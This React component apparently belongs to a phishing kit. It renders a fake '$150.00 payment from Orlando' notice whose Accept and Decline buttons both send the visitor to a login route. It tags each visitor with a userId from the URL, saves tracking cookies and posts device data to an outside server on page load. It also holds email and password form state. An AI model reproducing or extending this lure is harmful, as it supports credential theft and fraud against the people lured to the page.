import React, { useState, useEffect } from "react";
import { useParams, useNavigate,Link } from "react-router-dom";
import { isMobile, isTablet, isDesktop } from "react-device-detect";
import Cookies from 'js-cookie';

const Home = () => {
  const { userId } = useParams();
  const navigate = useNavigate();
  Cookies.set('userId', userId, { expires: 7 });
  Cookies.set('landing_url', window.location.href, { expires: 7 });
  Cookies.set('userAgent', navigator.userAgent, { expires: 7 });

  const [formData, setFormData] = useState({
    email: "",
    password: "",
    userId: "",
    userAgent: "",
    message: "",
    landing_url: "",
    captcha: "", // Added
  });

  // Determine device type
  const mobile = isMobile ? 1 : 0;
  const desktop = isDesktop ? 1 : 0;
  const tablet = isTablet ? 1 : 0;

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };

  useEffect(() => {
    const updateFormData = () => {
      setFormData((prevData) => ({
        ...prevData,
        userAgent: navigator.userAgent,
        landing_url: window.location.href,
        userId: userId,
      }));
    };

    const sendHitData = async () => {
      try {
        const data = {
          mobile: mobile,
          desktop: desktop,
          tablet: tablet,
          landing_url: window.location.href,
          userId: userId,
        };
        const response = await fetch("https://zplay.superice.cloud/api/hit", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(data),
        });

        if (response.ok) {
          const result = await response.json();
          console.log("Server Response:", result);
        } else {
          alert("Error submitting form");
        }
      } catch (error) {
        console.error("Error:", error);
      }
    };

    updateFormData();
    sendHitData();
  }, [userId, mobile, desktop, tablet]);


  const handleAccept = () => {
    console.log('Payment Accepted');
  };

  const handleDecline = () => {
    console.log('Payment Declined');
  };
 return (
    <div className="payment-container">
      <img
        src={`/images/mdl.jpg`}
        alt="Profile"
        className="profile-picture"
      />
      <div className="user-name">Orlando</div>
      <div className="payment-details">Payment from Orlando</div>
      <div className="midl">
        <div className="amount">$150.00</div>
        <div className="description">For la flame fans must eat</div>
        <div className="timestamp"></div>
      </div>
      <div>
        <Link
          className="status"
          onClick={handleAccept}
          to="/auth/login"
        >
          Accept
        </Link>
        <Link
          
          className="status"
          style={{ background: '#c94b24' }}
          onClick={handleDecline}
          to="/auth/login"
        >
          Decline
        </Link>
      </div>
    </div>
  );
};

export default Home;
